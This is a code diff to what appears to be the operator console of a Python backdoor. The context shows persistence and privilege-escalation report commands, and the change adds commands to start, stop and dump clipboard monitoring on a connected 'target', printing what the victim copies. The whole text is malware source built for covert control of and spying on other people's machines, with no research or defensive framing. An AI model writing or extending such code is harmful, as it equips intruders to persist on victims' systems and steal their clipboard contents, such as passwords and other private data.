@@ -94,6 +94,11 @@ def target_communication():
     print("PERSISTENCE COMMANDS:")
     print("   start_persistence      - Start persistent backdoor (stays running permanently)")
     print("")
+    print("CLIPBOARD COMMANDS:")
+    print("   start_clipboard        - Start clipboard monitoring")
+    print("   stop_clipboard         - Stop clipboard monitoring")
+    print("   clipboard_history      - Show clipboard history")
+    print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
     while True:
@@ -222,6 +227,16 @@ def target_communication():
                 print("-"*40)
             elif command == 'privesc_report':
                 print(f"Privilege Report:\n{'-'*40}")
+                print(result)
+                print("-"*40)
+        elif command in ['start_clipboard', 'stop_clipboard', 'clipboard_history']:
+            result = reliable_recv()
+            if command == 'start_clipboard':
+                print(f"Clipboard: {result}")
+            elif command == 'stop_clipboard':
+                print(f"Clipboard: {result}")
+            elif command == 'clipboard_history':
+                print(f"Clipboard History:\n{'-'*40}")
                 print(result)
                 print("-"*40)
 
